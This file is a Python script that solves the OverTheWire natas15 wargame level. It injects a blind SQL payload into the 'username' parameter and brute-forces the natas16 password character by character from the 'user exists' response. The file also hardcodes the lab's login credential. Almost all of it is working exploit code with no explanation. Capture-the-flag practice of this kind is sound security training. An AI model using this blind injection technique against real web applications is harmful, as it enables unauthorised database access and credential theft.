import requests
from bs4 import BeautifulSoup

def get_page_text(query_dict):
	r = requests.get(
		"http://natas15.natas.labs.overthewire.org",
		auth= ("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"),
		params= query_dict)
	return r.text

def is_exists(body):
	html = BeautifulSoup(body, "html.parser")
	text = html.find(id="content").get_text().strip()
	return "This user exists" in text


def get_next_char(index, possible_chars):
    next_index = index + 1
    return next_index, possible_chars[index]

def get_password():
	possible_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
	password = ""
	index = 0
	while True:
		try:
			index, char = get_next_char(index, possible_chars)
		except IndexError:
			return password
		password_guess = "".join([password, char, "%"])
		print('\tTrying password "{0}..."'.format(password_guess[:-1]))
		text = get_page_text({
			"username": 'natas16" AND password LIKE BINARY "{0}'.format(password_guess)
		})

		if is_exists(text):
			password = "".join([password, char])
			print('\nPassword: {0}\n'.format(password))
			index = 0


def main():
	print get_password()

if __name__ == "__main__":
	main()